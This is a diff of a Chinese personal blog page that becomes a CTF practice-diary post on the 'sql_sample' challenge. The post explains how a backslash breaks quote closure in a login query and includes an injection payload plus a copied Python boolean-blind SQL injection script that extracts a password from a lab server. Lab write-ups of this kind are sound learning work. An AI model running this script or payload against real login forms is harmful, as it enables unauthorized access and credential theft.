@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            20240331刷题日记-sql
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -32,15 +32,32 @@
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">20240331刷题日记-sql</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-03-31
+                        </span>
+                        
+                            
+                                <span id="/article/2093147683/" class="leancloud_visitors" data-flag-title="20240331刷题日记-sql">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2093147683/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
                 </div>
             
         </div>
@@ -49,77 +66,73 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
-                        
-                            目前共计 5 篇日志，继续加油！
-                        
-                    </span>
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="20240331刷题日记"><a href="#20240331刷题日记" class="headerlink" title="20240331刷题日记"></a>20240331刷题日记</h1><h2 id="sql-sample复现"><a href="#sql-sample复现" class="headerlink" title="sql_sample复现"></a>sql_sample复现</h2><p>找不到注入点，什么都被过滤，想起来有个robots.txt文件，发现hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and wxccc yyds.</span><br><span class="line"></span><br><span class="line">select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>密码必须输入wxccc？username单引号闭合</p>
+<p>没思路，去看wp了</p>
+<p><img src="/../images/sql.png"></p>
+<p>根据sql语句，可以加入\使引号改变闭合</p>
+<p>payload可以是password&#x3D;or 1 #&amp;username&#x3D;admin\</p>
+<img src="../images/0331-2.png" style="zoom:80%;" />
+
+<p>可以看到回显改变了，由于没学python，copy了一下脚本，用的应该是bool盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://210.30.97.133:28095/index.php&quot;</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        payload = <span class="string">&#x27;^ (ascii(substr((password),%d,1))&gt;%d)#&#x27;</span> % (i,mid)</span><br><span class="line">        <span class="comment"># select * from test where name=&#x27;admin\&#x27; and password=^ (ascii(substr((password),%d,1))&gt;%d)#</span></span><br><span class="line">        <span class="comment"># &#x27;admin and password=&#x27;^ (ascii(substr((password),%d,1))&gt;%d)   异或必为真</span></span><br><span class="line">        temp=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wxccc&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    password +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password=&quot;</span>,password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这下知道wxccc是干嘛的了，标记正确页面，运行得到密码</p>
+<p>password&#x3D; OhyOuFOuNdit</p>
+<p>在网页登录就拿到flag了</p>
+<p><img src="/../images/0331-3.png"></p>
+<p>异或的用法第一次见到，长知识了</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105123395">https://blog.csdn.net/SopRomeo/article/details/105123395</a></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Dyinglight
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/article/2093147683/" target="_blank">20240331刷题日记-sql</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                <div class="article-prev-next">
                     
                     
-                        
-                            <div class="archive-title">
-                                <h2 class="archive-year">2024</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2024/03/31/20240331%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-sql/"><span>20240331刷题日记-sql</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-31</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2024/03/30/20240330%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-1/"><span>20240330刷题日记</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-30</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2024/03/24/DUTCTF2024-wp/"><span>DUTCTF2024 wp</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-24</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2024/03/24/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"><span>第一篇文章</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-24</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2024/03/24/hello-world/"><span>Hello World</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-24</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/article/2623458554/" class="next-prefix">» </a> 下一篇：    <a href="/article/2623458554/" title="发布于 2024-03-30 05:40">20240330刷题日记</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+ 
+        </div>
     
 </div>
     <div id="footer">
@@ -157,7 +170,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
